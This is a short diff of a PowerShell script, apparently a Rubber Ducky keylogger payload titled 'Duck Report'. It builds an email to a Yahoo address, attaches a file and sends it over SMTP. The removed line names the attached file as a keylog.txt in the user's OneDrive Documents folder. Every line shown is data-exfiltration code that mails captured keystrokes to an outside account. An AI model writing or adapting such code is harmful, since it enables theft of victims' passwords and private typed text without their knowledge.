@@ -7,6 +7,5 @@ $ReportEmail.From = 'ducky.rub@yahoo.com'
 $ReportEmail.To.Add('ducky.rub@yahoo.com')
 $ReportEmail.Subject = 'Duck Report'
 $ReportEmail.Body = 'Attached is your duck report.... Quack' 
-$files="$($env:USERPROFILE)\OneDrive\Documents\keylog.txt"
 $ReportEmail.Attachments.Add($files)
 $SMTPInfo.Send($ReportEmail)
